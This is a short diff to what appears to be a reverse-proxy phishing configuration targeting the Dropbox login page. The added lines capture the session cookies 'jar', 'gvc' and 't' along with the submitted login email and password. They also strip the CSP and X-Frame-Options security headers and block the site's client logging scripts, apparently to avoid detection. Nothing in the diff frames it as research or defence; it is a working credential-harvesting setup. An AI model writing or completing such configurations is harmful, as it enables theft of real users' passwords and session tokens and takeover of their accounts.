@@ -6,15 +6,21 @@ proxy_hosts:
     target: "www.dropbox.com"
 auth_urls: ["/login"]
 landing_path: ["/login"]
-auth_tokens: []
-credentials: []
+auth_tokens:
+  - {type: "cookie", name: "jar"}
+  - {type: "cookie", name: "gvc"}
+  - {type: "cookie", name: "t"}
+credentials:
+  - {type: "post_param", name: "login_email", regex: null}
+  - {type: "post_param", name: "login_password", regex: null}
 injections: []
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
 path_rewrites:
   - {pattern: "^/$", replace: "/login", methods: ["GET"]}
 cookie_rewrites: []
 blocklist:
-  - {pattern: "analytics|/static/", mimes: ["text/javascript"], max_kb: 512}
+  - {pattern: "analytics|/static/|/client_log", mimes: ["text/javascript"], max_kb: 512}
 form_actions:
   - {selector: "form[action*=\"login\"]", action_to: "/ajax_login"}
